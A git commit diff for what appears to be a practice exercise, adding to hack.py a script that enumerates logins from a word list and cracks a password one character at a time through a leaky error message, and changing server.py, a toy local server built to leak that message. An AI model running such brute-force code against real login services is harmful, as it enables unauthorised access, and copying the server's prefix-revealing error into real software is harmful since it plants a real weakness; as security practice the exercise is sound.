40e48d953b3ea962fe173dc88e94c4531351bfbf
Pawel <pjuszcze@gmail.com>
2021-02-25 23:38:32 +0100

    Added: Hacks to a server using vulnerability except

--- hack.py
+++ hack.py
@@ -3,6 +3,7 @@ import socket
 import itertools
 import string
 import json
+from icecream import ic
 
 """
 Args: Host, port
@@ -13,9 +14,10 @@ socket_1 = socket.socket()
 # address = (sys.argv[1], int(sys.argv[2]))
 address = ("192.168.0.102", 9090)
 
-alphabet = list(string.ascii_lowercase)
+alphabet_l = list(string.ascii_lowercase)
+alphabet_u = list(string.ascii_uppercase)
 nums = list(string.digits)
-all_char = list(itertools.chain(nums, alphabet))
+all_char = list(itertools.chain(nums, alphabet_l, alphabet_u))
 
 socket_1.connect(address)
 with open("passwords.txt", 'r') as f:
@@ -24,22 +26,60 @@ with open("passwords.txt", 'r') as f:
 with open('logins.txt', "r") as f:
     login_list = f.read().splitlines()
 
+def send_data(s1, data):
+    to_send = json.dumps(data)
+    s1.send(to_send.encode('utf8'))
+    response = s1.recv(1024).decode()
+    response = json.loads(response)
+    print("Response:", response)
+    return response
+
+secret_login = ""
+secret_password = ""
 
 for login in login_list:
-    w_password = ''
 
     login_json = {
     "login": login,
-    "password": w_password }
+    "password": "" }
+    
+    response = send_data(socket_1, login_json)
+    ic(login_json)
 
-    to_send = json.dumps(login_json)
-    socket_1.send(to_send.encode('utf8'))
-    response = socket_1.recv(1024).decode()
-    response = json.loads(response)
-    if response['result'] == 'Login OK.':
+    if response['result'] == 'Wrong password!':
+        secret_login = login
         break
 
-# input("Press:")
+    
+i = 0
+pas = ""
+response = {"result": ""}
+while response['result'] != "Connection success!":
+
+    for char in enumerate(all_char):
+        test = pas + char[1]
+
+        response = send_data(socket_1, {"login": secret_login, "password": test})
+        
+        if response['result'] == "Connection success!":
+           
+           pas += char[1]
+           break
+        elif response['result'] == "Wrong password!":
+            continue
+        elif response['result'] == 'Exception happened during login':
+            pas += char[1]
+            break
+
+response = json.dumps({"login": secret_login, "password": test})
+print("\nPASSWORD FINDED:\n", response)
+print(type(response))
+print("Login is:", pas)
+
+try:
+    json_reply = json.loads(response)
+except:
+    print('The output of your program is not a valid JSON:\n')
 """
 while True:
     # password list first
--- server.py
+++ server.py
@@ -1,12 +1,16 @@
 import socket
 import json
+from icecream import ic
 
 HOST = "192.168.0.102"
 PORT = 9090
-SERVER_LOGIN = "username1"
-SERVER_PASSWORD = "1234"
+SERVER_LOGIN = "admin1"
+SERVER_PASSWORD = "32Ca9b"
 resp1 = {"result": "Wrong password!"}
 resp2 = {"result": "Wrong login!"}
+resp3 = {"result": "Connection success!"}
+resp4 = {"result": "Wrong"}
+resp5 = {"result": "Exception happened during login"}
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.bind((HOST, PORT))
@@ -17,16 +21,37 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         print(f"Connected by: IP: {adr[0]}")
         while True:
             data = conn.recv(1024)
+            data = data.decode()
+
             if not data:
                 break
             else:
-                resp = json.loads(data.decode())
-                print("Data:", resp)
+                # odczyt danych
+                resp = json.loads(data)
+                print("Data correct: ", resp)
+                
+                # if Login OK
                 if resp['login'] == SERVER_LOGIN:
-                    print("Login OK.")
-                    conn.sendall(json.dumps(resp1).encode())
+                    print("Login correct")
+                    
+                    if resp['password'] == SERVER_PASSWORD:
+                        print("Login and password correct")
+                        conn.sendall(json.dumps({"result": "Connection success!"}).encode())
+                    elif resp['password'] == "":
+                        conn.sendall(json.dumps({"result": "Wrong password!"}).encode())
+                    elif SERVER_PASSWORD.startswith(resp['password']):
+                        print("Login correct and check letter:")
+                        ic(resp['password'])
+                        conn.sendall(json.dumps({"result": "Exception happened during login"}).encode())
+                    else:
+                        print("Wrong password!")
+                        conn.sendall(json.dumps({"result": "Wrong password!"}).encode())
+
+                # Wrong login!
                 else:
-                    print("Wrong login")
-                    conn.sendall(json.dumps(resp2).encode())
+                    print("Wrong, send feedback")
+                    
+                    conn.sendall(json.dumps({"result": "Wrong login!"}).encode())
+
 
 # python server.py
